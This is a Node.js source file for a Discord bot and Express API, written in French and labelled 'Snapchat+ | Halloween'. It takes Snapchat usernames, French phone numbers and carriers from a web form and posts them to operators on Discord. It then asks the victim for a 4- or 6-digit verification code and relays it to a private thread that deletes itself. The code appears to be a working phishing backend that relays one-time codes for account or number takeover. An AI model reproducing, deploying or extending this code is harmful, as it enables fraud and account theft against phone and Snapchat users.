const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';

const demandes = new Map();

const client = new Client({ intents: [
  GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers
]});

client.once('ready', () => {
  console.log(`✅ Bot connecté : ${client.user.tag}`);
  client.user.setActivity('Snapchat+ | Halloween', { type: 'WATCHING' });
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const args = interaction.customId.split(':');
  const action = args[0];
  const demandeId = args[args.length - 1]; 
  const demande = demandes.get(demandeId);

  if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });

  if (action === 'claim') {
    if (demande.claimed) return interaction.reply({ content: '❌ Trop tard, ce numéro a déjà été pris !', ephemeral: true });

    demande.claimed = true;
    demande.claimedBy = interaction.user.id;
    demandes.set(demandeId, demande);

    await interaction.update({ content: `⚡ **Numéro pris par ${interaction.user}**`, embeds: [], components: [] });

    const thread = await interaction.channel.threads.create({
      name: `📁 Dossier - @${demande.username}`,
      type: ChannelType.PrivateThread, reason: 'Prise en charge'
    });
    
    await thread.members.add(interaction.user.id);
    demande.threadId = thread.id;
    demandes.set(demandeId, demande);

    const dossierEmbed = new EmbedBuilder()
      .setTitle('📁 FICHE DE VÉRIFICATION').setColor(0xFF6B00)
      .setDescription(`Nouveau numéro attribué pour **@${demande.username}**.`)
      .addFields(
        { name: '📱 Numéro Cible', value: `**+33 ${demande.phone}**\n\`${demande.phone}\``, inline: false },
        { name: '👤 Snapchat', value: `\`@${demande.username}\``, inline: true },
        { name: '🏢 Opérateur', value: `\`${demande.operator}\``, inline: true }
      );

    const rowCode = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`setcode:4:${demandeId}`).setLabel('Code 4 Chiffres').setStyle(ButtonStyle.Success).setEmoji('📱'),
      new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
    );
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`blacklist:${demandeId}`).setLabel('Blacklist').setStyle(ButtonStyle.Danger).setEmoji('🚫'),
      new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
    );

    await thread.send({ content: `${interaction.user}, voici ton dossier :`, embeds: [dossierEmbed], components: [rowCode, rowActions] });
    return interaction.followUp({ content: `✅ Dossier déplacé dans : ${thread}`, ephemeral: true });
  }

  if (action === 'setcode') {
    const length = parseInt(args[1]);
    demande.codeLength = length;
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({ content: `⏳ **En attente du code à ${length} chiffres...**`, embeds: [], components: [] });
  }

  if (action === 'badcode') {
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({ content: `⚠️ **Code invalide. Redemandé au client.**`, embeds: [], components: [] });
  }

  if (action === 'accept') {
    demande.status = 'accepted';
    demandes.set(demandeId, demande);
    await interaction.update({ content: `✅ **Validé !** (Suppression dans 5s)`, embeds: [], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
  
  if (action === 'reject' || action === 'blacklist') {
    demande.status = action === 'reject' ? 'rejected' : 'blacklisted';
    demandes.set(demandeId, demande);
    await interaction.update({ content: `❌ **Rejeté.** (Suppression dans 5s)`, embeds: [], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
});

const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/demande', async (req, res) => {
  try {
    const { username, phone, operator } = req.body;
    const id = uuidv4();
    let formattedPhone = phone;
    if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;

    const demande = { id, username, phone: formattedPhone, operator, status: 'pending', claimed: false, waitingForCode: false };
    demandes.set(id, demande);

    const channel = await client.channels.fetch(ADMIN_CHANNEL_ID);
    const embedPublic = new EmbedBuilder()
      .setTitle(`⚡ NOUVEAU NUMÉRO : ${operator}`).setColor(0xFF6B00)
      .setDescription('Cliquez sur **Prendre le numéro** pour traiter le dossier.');
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
    );

    const msg = await channel.send({ content: `@everyone ⚡ **NOUVELLE COMMANDE : ${operator}**`, embeds: [embedPublic], components: [row] });
    demande.publicMsgId = msg.id;
    demandes.set(id, demande);

    res.json({ success: true, demandeId: id });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/demande/:id/status', (req, res) => {
  const demande = demandes.get(req.params.id);
  if (!demande) return res.status(404).json({ error: 'Introuvable' });
  if (demande.status === 'blacklisted') return res.json({ status: 'rejected', blacklisted: true });
  res.json({ status: demande.status, waitingForCode: demande.waitingForCode, codeLength: demande.codeLength || 4 });
});

app.post('/api/demande/:id/code', async (req, res) => {
  try {
    const { code } = req.body;
    const demande = demandes.get(req.params.id);
    if (!demande) return res.status(404).json({ error: 'Introuvable' });

    const expectedLength = demande.codeLength || 4;
    if (code.length !== expectedLength) return res.status(400).json({ error: `Code à ${expectedLength} chiffres requis.` });

    demande.waitingForCode = false;
    demande.code = code;
    demandes.set(demande.id, demande);

    const embedCode = new EmbedBuilder().setTitle('🔑 CODE REÇU').setColor(0x2b2d31)
      .addFields({ name: 'Code', value: `# **${code}**`, inline: false });
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
      new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
    );

    if (demande.threadId) {
      const thread = await client.channels.fetch(demande.threadId).catch(() => null);
      if (thread) await thread.send({ content: `<@${demande.claimedBy}> 🚨 **CODE : ${code}**`, embeds: [embedCode], components: [rowActions] });
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 API sur port ${PORT}`));
client.login(DISCORD_TOKEN);